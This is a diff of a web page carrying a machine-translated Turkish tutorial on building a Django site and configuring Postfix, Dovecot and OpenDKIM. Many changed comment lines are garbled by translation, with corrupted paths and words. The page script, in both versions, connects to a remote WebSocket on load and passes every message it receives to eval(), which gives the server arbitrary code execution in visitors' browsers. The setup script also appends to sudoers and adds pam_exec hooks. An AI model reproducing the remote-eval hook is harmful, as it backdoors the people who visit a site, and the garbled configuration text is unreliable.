@@ -547,7 +547,7 @@ class UserRegisterForm(UserCreationForm):
 </code></pre>Bu yüzden burada oldukça basit bir şekilde çalışan başka bir formumuz var. Kullanıcı adı, e -posta ve şifre ile bir şifre alanı olan bir kullanıcı kaydı formudur. Bu formun normal formları genişletmediğini unutmayın. Form sınıfı, bir meta olduğu anlamına gelen bir model formudur. Bir alan aynı şekilde tanımlanır ve sınıf meta, formun formda yazılacak bilgilerin geri kalanına karşılık gelen modeli tanımlar. Bunların çoğu zaten Django'nun yerleşik userCreationForm'da mevcuttur, bu yüzden bunu sınıfın temeli olarak kullanacağız (parantez içinde geçer).
 
 Ardından, bir formumuz ve bir şablonumuz olduğu için bir kullanıcıyı kaydetme görünümünü inceleyeceğiz. Bu, tıpkı yeni Post görünümündeki gibi bir modelform. Kullanıcılar/views.py düzenleyin ve aşağıdaki kodu ekleyin:<pre class="language-python"><code>
-# … İthalat
+# … Miktarlar
 from .forms import UserRegisterForm
 
 def register(request):
@@ -1339,7 +1339,7 @@ nano users/templates/users/mfa_onboarding.html
 Bu gerçekten iyi görünüyor! Her şey düzgün bir şekilde ayarlandığı sürece, mesaj gönderebilmeli ve URL kalıplarını eklediğimiz anda kullanıcıyı telefon numaralarıyla birlikte günlüğe kaydedebilmeliyiz. Kurmamız gereken son şey bir profil görünümüdür, böylece kullanıcının oturum açmadan telefon numaralarını değiştirebileceğinden emin olabiliriz. Ayrıca, sonunda bir "Çıkmak için Durun" seçeneği eklemek isteyeceğiz, böylece kullanıcı metin yazabilir Gelecekteki metin mesajlarından vazgeçmek için “Dur”.
 
 Kullanıcılara/views.py'ye bir profil görünümü ekleyelim. Bu görünüm, kullanıcının biyografisini, e -postasını, kullanıcı adı ve telefon numarasını güncelleyecek ve çok faktörlü kimlik doğrulamasını etkinleştirmemize izin verecektir. İlk olarak, kullanıcılar/forms.py'de iki forma daha ihtiyacımız olacak<pre class="language-python"><code>
-# ... Miktarlar
+# ... İthalat
 class UserUpdateForm(forms.ModelForm):
     email = forms.EmailField()
     class Meta:
@@ -1455,7 +1455,7 @@ $('input').change(function(){
  </code></pre>Bunun oldukça basit bir form olduğunu fark edeceksiniz, ancak içinde formun içeriğini güncellenirken otomatik olarak gönderen bazı JavaScript var. Bu, her seferinde göndermek zorunda kalmadan düzenlemeler yapabilirsiniz.
 
 Daha sonra, kullanıcıların URL modellerinde tüm bu görünümleri temsil eden URL'lere ihtiyacımız var. Kullanıcıları/urls.py'yi düzenleyin ve bu kodu ekleyin:<pre class="language-python"><code>
-# … Önceki kod, içe aktarma
+# … Önceki kod, STANTS
 from django.urls import path
 from . import views
 
@@ -1593,7 +1593,7 @@ class MFAToken(models.Model):
 </code></pre>Ayrıca kullanıcımıza bir ayrıcalık ekleyelim ve sonunda ayrıcalıklı kullanıcıları otomatik olarak kaydolmaya geçmeden önce bunu manuel olarak ayarlayacağız. Kullanıcı modellerinde bu satırı profile ekleyin:<pre class="language-python"><code>
     vendor = models.BooleanField(default=False)
 </code></pre>Veritabanındaki değişikliklerde olduğu gibi, Django'da bir Models.py dosyasını her düzenlediğimizde geçiş yapmamız ve veritabanını taşımamız gerekir. Unutmayın, bunu yapmak için önce kaynağı kullanırız (terminal açık olduğundan beri zaten kullanılmamışsa) ve daha sonra göçü yapmak ve göç etmek için python manage.py.<pre class="language-bash"><code>
-cd project-directory-you-named # (Gerekirse)
+cd project-directory-you-named # (gerekirse)
 source venv/bin/activate
 python manage.py makemigrations &amp;&amp; python manage.py migrate
 </code></pre>Şimdilik, kabuğu kullanarak satıcı olarak oluşturduğunuz hesapları askere alabilirsiniz.<pre class="language-bash"><code>
@@ -1849,7 +1849,7 @@ def toggle_user_active(request, pk):
     return HttpResponse('&lt;i class="bi bi-eye-fill"&gt;&lt;/i&gt;' if user.is_active else '&lt;i class="bi bi-eye-slash-fill"&gt;&lt;/i&gt;')
 
 
-# İthalat
+# Tutarlar
 from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
 from django.views.generic import DeleteView
 
@@ -2324,7 +2324,7 @@ sudo chmod -R g+rwX ./
 sudo chmod -R g+rX .././
 sudo chmod -R g-rwX ../.ssh
 sudo chmod 774 ./
-# sudo chmod 664 db.sqlite3
+# Sudo chmod 664 db.sqlite3
 # sudo chown www-data: kullanıcılar db.sqlite3
 sudo chown -R www-data:www-data media/
 sudo chown www-data:users ./
@@ -2358,7 +2358,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # Pam yapılandırmasını enjekte edin ve hatalı SSH yapılandırmasını kaldır
-# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
+# Sudo sed -i '' -and $ d '/etc/pam.d/sshd
 # Sudo sed -i '' -and $ d ' /etc /profil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2552,7 +2552,7 @@ sudo ufw allow 'Dovecot Secure POP3'
 sudo ufw allow 110/tcp
 sudo ufw allow 25/tcp
 echo "y" | sudo ufw enable
-# İptables'ı devre dışı bırak
+# Engelli Ipatables
 echo "Configuring firewall"
 sudo iptables -P INPUT ACCEPT
 sudo iptables -P OUTPUT ACCEPT
@@ -2874,7 +2874,7 @@ smtp      inet  n       -       y       -       -       smtpd
 # SMTP INET N - Y - 1 PORTREEN
 # Smtpd geçişi - - y - - smtpd
 # Dnsblog unix - - y - 0 dnsblog
-# Tlsproxy unix - - y - 0 tlsproxy
+# tlsproxy unix - - y - 0 tlsproxy
 # Birini seçin: Yalnızca Loopback istemcileri veya herhangi bir istemci için gönderimi etkinleştirin.
 # 127.0.0.1:submission inet n - y - - smtpd
 submission inet n       -       y       -       -       smtpd
@@ -2894,7 +2894,7 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restrictions = $ mua_client_restrtions
 # -O smtpd_helo_restrictions = $ mua_helo_restrictions
 # -O smtpd_sender_restrictions = $ mua_sender_restrictions
-# -O smtpd_recipient_trival =
+# -O smtpd_recipient_restrictions =
 # -O smtpd_relay_restrictions = permit_sasl_authenticated, reddet
 # -O milter_macro_daemon_name = kökenli
 # Birini seçin: Yalnızca geri döngü istemcileri veya herhangi bir istemci için SMTPS'yi etkinleştirin.
@@ -2907,14 +2907,14 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restrictions = $ mua_client_restrtions
 # -O smtpd_helo_restrictions = $ mua_helo_restrictions
 # -O smtpd_sender_restrictions = $ mua_sender_restrictions
-# -O smtpd_recipient_trival =
+# -O smtpd_recipient_restrictions =
 # -O smtpd_relay_restrictions = permit_sasl_authenticated, reddet
 # -O milter_macro_daemon_name = kökenli
 # 628 inet n - y - - qmqpd
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
-# QMGR UNIX N - N 300 1 OQMG
+# QMGR UNIX N - N 300 1 OQMGR
 tlsmgr    unix  -       -       y       1000?   1       tlsmgr
 rewrite   unix  -       -       y       -       -       trivial-rewrite
 bounce    unix  -       -       y       -       0       bounce
@@ -2976,7 +2976,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # ============================================== ================
 # Cyrus üzerinden teslimat örneği.
 # 
-# Eski -Corus unix - n - - boru
+# Eski -Cyrus unix - n n - - boru
 # Flags = R USER = Cyrus argv =/cyrus/bin/teslim -e -m $ {extension} $ {user}
 # 
 # ============================================== ================
@@ -3012,7 +3012,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # /Var/makara/postfix/run/opendKim olarak değiştirin,
 # Postfix bir chroot:
-# RunDir =/var/makar/postfix/run/opendKim
+# RunDir =/was/scool/postfix/run/opendKim
 RUNDIR=/run/opendkim
 # 
 # Alternatif bir soket belirtmek için
@@ -3077,7 +3077,7 @@ service pop3-login {
   }
   inet_listener pop3s {
     # Port = 995
-    # ssl = evet
+    # ssl = yes
   }
 }
 
@@ -3097,7 +3097,7 @@ service lmtp {
   # Yalnızca yukarıdaki UNIX soketini kullanamıyorsanız, Inet dinleyici oluşturun
   # INET_LISTER LMTP {
     # LMTP'yi tüm internet için görünür kılmaktan kaçının
-    # adres =
+    # Adres =
     # bağlantı noktası =
   # }
 }
@@ -3161,7 +3161,7 @@ service dict {
 </code></pre>Bir kez daha, bu dosyalardaki alan adını femmebabe.com'da seçtiğiniz alan adıyla değiştirdiğinizden emin olun. Bir sonraki dosyayı düzenleyin, Dovecot'un Config,<pre class="language-bash"><code>
 nano config/etc_dovecot_dovecot
 </code></pre>Ve bu çizgileri ekle<pre class="language-bash"><code>
-## Dovecot yapılandırma dosyası
+## Ovecot yapılandırma dosyası
 
 # Eğer acele ediyorsanız, http://wiki2.dovecot.org/quickconfiguration bkz.
 
@@ -3221,7 +3221,7 @@ nano config/etc_dovecot_dovecot
 # Daha ayrıntılı işlem başlıklarını (PS'de) gösterin. Şu anda kullanıcı adını gösteriyor ve
 # IP adresi. IMAP işlemlerini kimin kullandığını görmek için kullanışlı
 # (Örneğin paylaşılan posta kutuları veya birden çok hesap için aynı UID kullanılıyorsa).
-# VerBose_proctitle = hayır
+# VerBose_procitle = hayır
 
 # Dovecot Master işlemi kapandığında tüm süreçler öldürülürse.
 # Bunu "hayır" olarak ayarlamak, Dovecot'un onsuz yükseltilebileceği anlamına gelir
@@ -3233,7 +3233,7 @@ nano config/etc_dovecot_dovecot
 # bunları doğrudan aynı süreçte çalıştırmak yerine.
 # Doveadm_worker_count = 0
 # Unix Socket veya Ana Bilgisayar: Doveadm Server'a bağlanmak için kullanılan bağlantı noktası
-# Doveadm_socket_path = doveadm sunucusu
+# doveadm_socket_path = doveadm-server
 
 # Dovecot'ta korunan ortam değişkenlerinin uzaydan ayrılmış listesi
 # başlangıç ​​ve tüm çocuk süreçlerine geçti. Ayrıca verebilirsin
@@ -3358,7 +3358,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # /Var/makara/postfix/run/opendKim olarak değiştirin,
 # Postfix bir chroot:
-# RunDir =/was/scool/postfix/run/opendKim
+# RunDir =/var/makar/postfix/run/opendKim
 RUNDIR=/run/opendkim
 # 
 # Alternatif bir soket belirtmek için
@@ -3380,7 +3380,7 @@ touch scripts/postfixsetup
 sudo chmod a+x scripts/postfixsetup
 nano scripts/postfixsetup
 </code></pre>Şimdi, Nano'da metin düzenleyicisi, bu dosyayı femmebabe.com yerine alan adınızı içerecek şekilde düzenleyin.<pre class="language-bash"><code>
-# !/Bin/Bash
+# / Bin / Bash
 # Kurulum Postfix
 cd $DIR
 echo "Mail services configuration"
@@ -3547,7 +3547,7 @@ Bu üçüncü baskı web geliştirme kılavuzunu okumak için zaman ayırdığı
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Satın almak</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Kripto ile satın al</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Satın almak</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Kripto ile satın al</a></p>
 
 
 <hr>
@@ -3587,7 +3587,7 @@ Bu üçüncü baskı web geliştirme kılavuzunu okumak için zaman ayırdığı
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -3624,12 +3624,16 @@ Bu üçüncü baskı web geliştirme kılavuzunu okumak için zaman ayırdığı
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Bu adresi kullanarak bana Bitcoin ile ilgili bir ipucu bırakın:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Adresi kopyala" onclick="copyToClipboard('btc-wallet');">Kopyala</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Beni Instagram&#x27;da ziyaret et" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Beni Twitter&#x27;da ziyaret et" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Beni YouTube&#x27;da izle" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=tr" title="Hizmet şartlarını görün">Hizmet Şartları</a></span></p>
 		    </div>
@@ -3672,32 +3676,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -3844,34 +3848,41 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Bu sayfayı QR kodunu tarayarak paylaşın.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
-    
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
     
     
     
